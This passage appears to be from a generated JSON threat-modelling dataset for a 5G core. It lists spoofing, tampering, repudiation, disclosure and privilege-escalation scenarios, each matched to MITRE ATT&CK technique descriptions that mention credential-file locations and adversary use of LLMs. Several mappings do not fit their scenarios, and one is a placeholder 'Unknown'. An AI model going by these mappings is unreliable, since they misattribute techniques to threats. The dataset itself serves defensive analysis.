            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "VNFs"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the network management software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The network management software contains exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Unpatched or outdated software."
                },
                {
                    "Assumption": "The attacker has access to an account with lower privileges.",
                    "Role": "Attacker",
                    "Condition": "Compromised lower-privileged account."
                }
            ],
            "Potential Impact": "Unauthorized administrative control over the network and its configurations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "network management"
            ],
            "mitre_technique": {
                "name": "Network Device Configuration Dump",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
                "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
                "technique_id": "T1602.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with access to one network slice exploits misconfigured access controls to gain unauthorized access to other network slices.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are not properly enforced between network slices.",
                    "Role": "System",
                    "Condition": "Misconfigured access control policies."
                },
                {
                    "Assumption": "The user has legitimate access to at least one network slice.",
                    "Role": "User",
                    "Condition": "Valid user credentials."
                }
            ],
            "Potential Impact": "Unauthorized access to restricted network segments and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "network slices"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick an administrator into granting elevated privileges or executing administrative tasks.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has identified and targeted a legitimate administrator.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the network's administration staff."
                },
                {
                    "Assumption": "The administrator is not adequately trained to recognize social engineering tactics.",
                    "Role": "User",
                    "Condition": "Insufficient security awareness training."
                }
            ],
            "Potential Impact": "Gaining unauthorized administrative control and performing privileged actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "administrator"
            ],
            "mitre_technique": {
                "name": "Artificial Intelligence",
                "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI)\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI)\n",
                "id": "attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e",
                "technique_id": "T1588.007"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate network slice to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the network slice configurations.",
                    "Role": "Attacker",
                    "Condition": "Valid if insider or through reconnaissance."
                },
                {
                    "Assumption": "The 5G core system lacks strict authentication mechanisms for network slices.",
                    "Role": "System Designer",
                    "Condition": "Valid without multi-factor authentication."
                },
                {
                    "Assumption": "Trust boundaries are not robustly enforced.",
                    "Role": "System Admin",
                    "Condition": "Valid if weak enforcement of trust boundaries."
                }
            ],
            "Potential Impact": "Unauthorized access to network slices, leading to data breaches and potential system control.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network slice",
                "unauthorized access",
                "reconnaissance"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a Network Function Virtualization Orchestrator (NFVO).",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised a device or system within the trusted network.",
                    "Role": "Attacker",
                    "Condition": "Valid with malware infection."
                },
                {
                    "Assumption": "The NFVO does not use encrypted communication channels.",
                    "Role": "System Designer",
                    "Condition": "Valid if communication is unencrypted."
                },
                {
                    "Assumption": "Access controls for NFVO are insufficient.",
                    "Role": "System Admin",
                    "Condition": "Valid if access controls are weak or misconfigured."
                }
            ],
            "Potential Impact": "Control over network slices, leading to data manipulation and disruption of services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "NFVO",
                "access control",
                "malware"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate external interface to breach the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or forge traffic to and from external interfaces.",
                    "Role": "Attacker",
                    "Condition": "Valid with network interception tools."
                },
                {
                    "Assumption": "External interfaces are not rigorously authenticated.",
                    "Role": "System Designer",
                    "Condition": "Valid without strong interface authentication."
                },
                {
                    "Assumption": "There are weak monitoring and alerting systems for unusual activity.",
                    "Role": "System Admin",
                    "Condition": "Valid if monitoring systems are inadequate."
                }
            ],
            "Potential Impact": "Exfiltration of sensitive data and potential injection of malicious traffic.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interface",
                "network interception",
                "forged traffic"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies VNFs to disrupt specific network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the virtualized layer hosting VNFs.",
                    "Role": "Attacker",
                    "Condition": "Valid with compromised hypervisor or container."
                },
                {
                    "Assumption": "There is insufficient integrity checking for VNFs.",
                    "Role": "System Admin",
                    "Condition": "Valid if integrity checks are missing."
                },
                {
                    "Assumption": "Logging and auditing of VNF operations are not comprehensive.",
                    "Role": "System Admin",
                    "Condition": "Valid if logging is inadequate."
                }
            ],
            "Potential Impact": "Corruption of data and disruption of service operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "data corruption",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the orchestration and management system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has administrative access to the system.",
                    "Role": "Attacker",
                    "Condition": "Valid with privileged account compromise."
                },
                {
                    "Assumption": "There are no checks for unauthorized changes in the orchestration system.",
                    "Role": "System Admin",
                    "Condition": "Valid without change management protocols."
                },
                {
                    "Assumption": "Vulnerability in the software allows code injection.",
                    "Role": "Developer",
                    "Condition": "Valid in the presence of software vulnerabilities."
                }
            ],
            "Potential Impact": "Operational failures and potential spread of malware to network slices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "orchestration",
                "malware"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with data in transit between edge and cloud computing nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data between nodes is transmitted unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid without encryption protocols."
                },
                {
                    "Assumption": "The attacker has physical or logical access to the transmission medium.",
                    "Role": "Attacker",
                    "Condition": "Valid if medium is accessible."
                },
                {
                    "Assumption": "Insufficient validation of data integrity at endpoints.",
                    "Role": "System Admin",
                    "Condition": "Valid without checksum or validation mechanisms."
                }
            ],
            "Potential Impact": "Data integrity compromise leading to incorrect processing and decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "edge computing",
                "cloud computing"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies performing actions within a network slice due to lack of logging.",
            "Assumptions": [
                {
                    "Assumption": "No comprehensive logging of user actions on network slices.",
                    "Role": "System Admin",
                    "Condition": "Valid if logging mechanisms are weak."
                },
                {
                    "Assumption": "Network slices do not keep immutable logs.",
                    "Role": "System Designer",
                    "Condition": "Valid without immutable log storage."
                },
                {
                    "Assumption": "No multifactor verification of user actions.",
                    "Role": "System Admin",
                    "Condition": "Valid if multi-factor authentication is missing."
                }
            ],
            "Potential Impact": "Difficulty in tracing malicious actions back to the culprit.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user actions",
                "traceability"
            ],
            "mitre_technique": {
                "name": "Private Keys",
                "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
                "id": "attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe",
                "technique_id": "T1145"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logs to cover their tracks within the orchestration system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has privileged access to logging mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid with administrative privileges."
                },
                {
                    "Assumption": "Log integrity is not protected.",
                    "Role": "System Admin",
                    "Condition": "Valid if no log integrity mechanisms are in place."
                },
                {
                    "Assumption": "No regular log audits are performed.",
                    "Role": "Security Auditor",
                    "Condition": "Valid if audits are irregular or non-existent."
                }
            ],
            "Potential Impact": "Misjudgment in incident response and failure in forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "forensics",
                "incident response"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses a compromised external interface and denies unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces do not log every access attempt.",
                    "Role": "System Admin",
                    "Condition": "Valid if logging is incomplete."
                },
                {
                    "Assumption": "No real-time monitoring of external interface connections.",
                    "Role": "Security Analyst",
                    "Condition": "Valid without real-time monitoring tools."
                },
                {
                    "Assumption": "No verification and authentication of external connections.",
                    "Role": "System Admin",
                    "Condition": "Valid without connection authentication mechanisms."
                }
            ],
            "Potential Impact": "Inability to establish accountability and prevent future breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "external interface",
                "unauthorized access",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted between VNFs and orchestration systems.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data is transmitted unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid without encryption standards."
                },
                {
                    "Assumption": "The attacker has the capability to intercept communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid with network surveillance tools."
                },
                {
                    "Assumption": "No end-to-end encryption implemented.",
                    "Role": "System Admin",
                    "Condition": "Valid if encryption is partial or missing."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "sensitive data",
                "unsecured communication"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to network slice data through a compromised VNF.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are not isolated securely from each other.",
                    "Role": "System Designer",
                    "Condition": "Valid without secure isolation policies."
                },
                {
                    "Assumption": "The attacker can exploit VNF vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities are present."
                },
                {
                    "Assumption": "Data protection policies within VNFs are lax.",
                    "Role": "System Admin",
                    "Condition": "Valid if data protection is inadequate."
                }
            ],
            "Potential Impact": "Leakage of sensitive data across network slices.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "VNF",
                "network slice",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data exposed via poorly secured external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces handle sensitive data without adequate protection.",
                    "Role": "System Designer",
                    "Condition": "Valid if poor data protection measures are in place."
                },
                {
                    "Assumption": "Attackers can exploit vulnerabilities in external interfaces.",
                    "Role": "Attacker",
                    "Condition": "Valid with known exploits."
                },
                {
                    "Assumption": "No regular security assessments on external interfaces.",
                    "Role": "Security Auditor",
                    "Condition": "Valid without regular assessments."
                }
            ],
            "Potential Impact": "Exposure of sensitive data to unauthorized external parties.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interface",
                "data protection",
                "exploits"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods a network slice with excessive traffic, disrupting service.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting mechanisms for network slices.",
                    "Role": "System Designer",
                    "Condition": "Valid without traffic rate limiting."
                },
                {
                    "Assumption": "The attacker can generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid with access to botnets or similar resources."
                },
                {
